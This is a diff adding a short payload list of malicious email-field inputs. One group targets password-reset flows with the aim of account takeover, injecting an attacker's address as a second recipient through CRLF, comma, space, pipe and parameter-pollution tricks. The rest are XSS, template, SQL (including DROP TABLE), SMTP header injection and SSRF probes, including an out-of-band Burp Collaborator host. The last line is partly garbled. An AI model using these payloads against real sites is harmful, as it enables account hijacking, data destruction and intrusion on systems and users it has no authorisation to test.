@@ -1,0 +1,19 @@
+# Password Reset Input, Possible ATO
+victim@xyz.tld%0a%0dcc:hacker@xyz.tld
+victim@xyz.tld,hacker@xyz.tld
+victim@xyz.tld%20hacker@xyz.tld
+victim@xyz.tld|hacker@xyz.tld
+victim@xyz
+## Use parameter pollution too.
+# Injection..etc
+test+(<script>alert(1)</script>)@example.com
+test@example(<script>alert(1)</script>).com
+"<script>alert(1)</script>"@example.com
+"<%=7*7%>"@example.com
+test+(${{7*7}})@example.com
+"'OR 1=1--"@example.com
+"mail');DROP TABLE users;--"@example.com
+test@example.burpcollaborator.net
+test@[127.0.0.1]
+victim&email=attacker@example.com
+"%0d%0aContent-Lenght:%200@0d%0a%0d%0a"@example.com"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
